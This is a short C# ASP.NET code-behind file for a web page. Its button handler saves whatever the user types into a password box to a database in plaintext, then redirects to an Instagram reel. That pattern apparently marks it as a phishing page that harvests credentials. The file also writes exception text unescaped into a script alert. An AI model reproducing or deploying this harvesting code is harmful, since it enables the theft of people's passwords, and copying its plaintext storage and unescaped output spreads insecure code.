﻿using System;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Web.UI;

namespace WebApplication2
{
    public partial class SiteMaster : MasterPage
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Button2_Click(object sender, EventArgs e)
        {
            string strcon = ConfigurationManager.ConnectionStrings["con"].ConnectionString;

            try
            {
                SqlConnection con = new SqlConnection(strcon);
                if (con.State == ConnectionState.Closed)
                {
                    con.Open();
                }
                SqlCommand cmd = new SqlCommand("addpassword");
                cmd.CommandType = CommandType.StoredProcedure;
                cmd.Parameters.AddWithValue("@pass", TextBox2.Text.Trim());
                cmd.Connection = con;

                cmd.ExecuteNonQuery();

                Response.Redirect("https://www.instagram.com/reel/CfhMhCjJr3L/?igshid=YmMyMTA2M2Y=");

                con.Close();
            }
            catch (Exception ex)
            {
                Response.Write("<script>alert('" + ex.Message + "');</script>");
            }
        }

    }
}